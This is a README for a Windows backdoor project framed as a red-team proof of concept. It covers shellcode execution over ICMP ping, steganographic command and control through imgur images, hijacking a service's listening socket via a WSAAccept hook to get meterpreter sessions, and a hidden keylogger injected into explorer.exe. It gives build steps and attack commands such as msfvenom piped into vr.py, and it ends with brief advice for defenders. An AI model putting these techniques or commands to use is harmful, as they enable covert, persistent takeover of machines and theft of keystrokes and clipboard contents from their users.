Virtual Reality
===============

This is a backdoor project for windows operating systems.

## Intended audience

This is a proof-of-concept stealthy backdoor aimed to aid red teams in maintaining
control of their targets during the security evaluation process. The project also intends
to expose ways to abuse standard features.

## Features

Extremely stealthy backdoor for Windows platform.

* ICMP-PING backdoor. Passively listens for incoming pings and executes shellcode
delivered in ping payload.
* HTTP backdoor using steganographically encoded images hosted on imgur.com
* Grand-theft-socket - a payload for executing shellcode through the socket of existing
service,
* Runs on anything from XP to W10

## Details

* Small size by using tinystl and avoiding standard c++ stl
* Cooperative multitasking achieved by using Windows fibers
* Permissively licensed, including all dependencies

## Build instructions

1. (Optional) Download appropriate [VC-LTL](https://github.com/Chuyu-Team/VC-LTL/releases)
and extract to `VC-LTL` folder.
2. `git clone https://github.com/rokups/virtual-reality`. Now you have two folders next to
each other: `VC-LTL` and `virtual-reality.
3. `mkdir cmake-build; cd cmake-build`.
4. `cmake -DCMAKE_BUILD_TYPE=MinSizeRel ../virtual-reality`.
5. `cmake --build . --config MinSizeRel`. Note that VC-LTL does not support debug builds.
Do not build `Debug` configuration or ensure that `_DEBUG` preprocessor symbol is undefined.
6. Payloads are found in `cmake-build/bin` directory.

VC-LTL is used for linking to `msvcrt.dll` and greatly reducing executable sizes.

MinGW builds are deprecated. They may work or may be broken. Reason for this is that
executables built with MinGW crash when used in some injection techniques. I did not
care enough to figure it out.

## Instructions

Modify `config.h` to suit your needs.

Use `vr.py` to interact with the backdoor.

### Shellcode payload

`vr.py shellcode path/to/shellcode.bin` reads shellcode into the script's memory.
On its own this is useless therefore combine it with other commands. You may
use `-` instead of path in order to read shellcode from `stdin`.

### Ping transport

`msfvenom <...> | vr.py shellcode - -- ping 192.168.0.1` reads a shellcode from
`stdin` and sends it via icmp-ping to `192.168.0.1`. Backdoor running on that
machine will execute this shellcode.

The shellcode will be delivered to the target by sending it as ICMP-PING packet payload.

![ping-demo](https://user-images.githubusercontent.com/19151258/52339219-2c742600-2a15-11e9-95b0-212485421e35.png)

Content of the packet appears to be random. The only give-away that something is up
is a rather big packet size, although it is possible to customized packet size
using ping utility or specify custom payload (Linux).

### imgur.com transport

`msfvenom <...> | vr.py shellcode - -- png path/to/image.png` reads a shellcode
from `stdin` and encodes into specified `image.png`. This image must exist and
it must be in RGB format (no alpha). Resulting image should be uploaded to
https://imgur.com/ and tagged with one or more tags while one of the tags must be
one that is specified in `config.h`.

The shellcode will be encoded into a specified image by altering the last two bits of
each color component in the target image. 1 byte needs 4 color components
to be encoded and thus requires 1.(3) pixels. Encoded images are indistinguishable
from original to the naked eye. Backdoor queries imgur API for listing images
tagged with a configured tag. Every new image is downloaded and inspected for
encoded payload.

![steg-demo](https://user-images.githubusercontent.com/19151258/52338654-adcab900-2a13-11e9-9887-3a55cde9dc36.png)

Left - original image. Right - image with the encoded payload. Bottom - difference mask.
120x75 image was used. As you can see only a tiny portion of the pretty small image is used
to encode 449 bytes payload.

### Grand-theft-socket

This is a technique meant to backdoor a machine that:
1. Has a public service listening (TCP).
2. No outgoing traffic is allowed.

`gts.dll` payload is meant to be injected to process of service that listens on public
interface. This payload hooks `WSAAccept()` function and allows creating meterpreter
session through the listening socket of already existing service while still allowing
normal traffic to flow as if nothing has happened.

When new connection is being made payload does the following:
1. Looks for a `tcp_knock` command and if found - whitelist command sender and terminate the connection.
2. When connection comes from a whitelisted IP address:
  1. Spawn a new process.
  2. `WSADuplicateSocket()` newly connected socket into the newly created process.
  3. The new process will read shellcode size, shellcode itself and execute received shellcode.
  4. Simulate disconnection by returning `INVALID_SOCKET` with `WSAECONNRESET` error to the host process.
  5. Clear whitelisted address. A new knock will be required for executing the next payload.
3. When connection is made from non-whitelisted address and no `tcp_knock` is received -
hand connection back to the host.

Usage:
1. On target host - inject `gts.dll` into process that accepts connections.
2. On source host - execute `vr.py tcp_knock target_ip_address service_port`
3. On source host - execute `meterpreter/bind_tcp` payload with `RHOST=target_ip_address`
and `LPORT=service_port` within 30 seconds since sending `tcp_knock`.
4. Observe that you just received meterpreter session.

### Keylogger

Keylogger module works by injecting a dll to a process that runs in user's session.
It is injected into explorer.exe by default. Only one injection per user session will
be active. Keylogger monitors user's keystrokes and clipboard and writes contents into
file `C:\Windows\Temp\????????-????-????-????-????????????.N` where `?` is `[A-F0-9]`
and `N` is a number (starting from 0). This file is a zip archive with first two bytes
zeroed out. In order to access logs user should download a file and restore first two
bytes which are `PK`. Removing file will cause keylogger to create a new archive next
time any logs are available. Keylogger thread exits and frees it's memory if main
backdoor terminates.

## Security

Payload is always obfuscated using the RC4 algorithm. As you probably have guessed
replay attacks are a thing against this backdoor. Also, backdoor may be controlled
by a rival blue team if they have reverse-engineered sample and recovered RC4
key. Utmost security is not the point of this project. If the blue team is on to the
backdoor - nothing will save it anyway.

## Recommendations

* If possible - filter out ICMP-PING packets within the firewall
* Take a proactive approach in monitoring your networks. Log everything and
look for abnormalities. Chances are your servers have no business querying
imgur.com or similar social media domains.
* Periodically scan your critical services for inline hooks.

## etc

Q: Why this name? This has nothing to do with virtual reality.

A: Nothing at all. And no reason really. Naming is hard.
